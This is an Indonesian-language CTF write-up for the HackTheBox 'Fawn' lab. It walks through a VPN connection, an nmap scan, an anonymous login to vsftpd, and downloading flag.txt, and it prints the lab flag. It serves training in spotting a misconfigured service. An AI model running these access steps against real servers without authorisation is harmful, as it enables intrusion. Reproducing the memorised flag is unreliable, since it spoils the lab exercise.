# Fawn — Anonymous FTP Login

**Date:** 2026-04-29
**Platform:** HackTheBox Starting Point
**Difficulty:** Very Easy
**Category:** Network

---

## Target
Mesin Linux dari HTB Starting Point Series. Menjalankan service FTP (vsftpd) yang dikonfigurasi secara tidak benar sehingga mengizinkan siapa saja login tanpa autentikasi.

## Vulnerability
Server FTP mengaktifkan fitur **Anonymous Login** — siapa saja bisa masuk tanpa username/password yang valid. Ini adalah misconfiguration umum di server FTP yang tidak dikelola dengan baik.

## Tools Used
- Nmap (port scanning & service detection)
- FTP Client (bawaan Linux/Kali)
- OpenVPN (koneksi ke jaringan HTB)

---

## Exploitation Steps

### Step 1 — Koneksi VPN ke HTB
Sebelum bisa menyerang target, harus terhubung ke jaringan lab HTB terlebih dahulu via OpenVPN.
```bash
sudo openvpn starting-point.ovpn
```

### Step 2 — Verifikasi Koneksi ke Target
Cek apakah target bisa dijangkau dari mesin kita.
```bash
ping 10.129.4.29
```
Output menunjukkan reply dari target → koneksi berhasil.

### Step 3 — Reconnaissance dengan Nmap
Scan port dan deteksi service yang berjalan di target.
```bash
nmap -sV 10.129.4.29
```
Hasil scan:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd
```
Port 21 (FTP) terbuka dan menjalankan vsftpd.

### Step 4 — Eksploitasi Anonymous FTP Login
Login ke server FTP menggunakan username `anonymous` tanpa password.
```bash
ftp 10.129.4.29
```
```
Name: anonymous
Password: (kosong, langsung Enter)
```
Berhasil masuk ke server FTP.

### Step 5 — Enumerasi File di Server
Lihat daftar file yang tersedia di dalam server.
```bash
ls
```
Ditemukan file `flag.txt` di direktori aktif.

### Step 6 — Download & Baca Flag
Download file ke mesin lokal lalu keluar dari sesi FTP.
```bash
get flag.txt
exit
```
Baca isi flag dari terminal Kali:
```bash
cat flag.txt
```

---

## Proof
```
Flag: 035db21c881520061c53e0536e44f815
```

---

## Lessons Learned
- FTP dengan Anonymous Login aktif adalah misconfiguration berbahaya yang masih sering ditemukan di dunia nyata
- Berbeda dengan Telnet yang memberikan akses shell penuh, FTP hanya memungkinkan transfer file — sehingga flag harus di-download dulu sebelum bisa dibaca
- File hasil `get` tersimpan di direktori aktif saat perintah `ftp` dijalankan — gunakan `pwd` untuk mengeceknya
- Workflow dasar HTB: VPN → ping → nmap → eksploitasi → ambil flag
- Untuk CTF berikutnya, lebih baik pindah ke direktori yang jelas (misal `~/Desktop`) sebelum menjalankan FTP agar file hasil download mudah ditemukan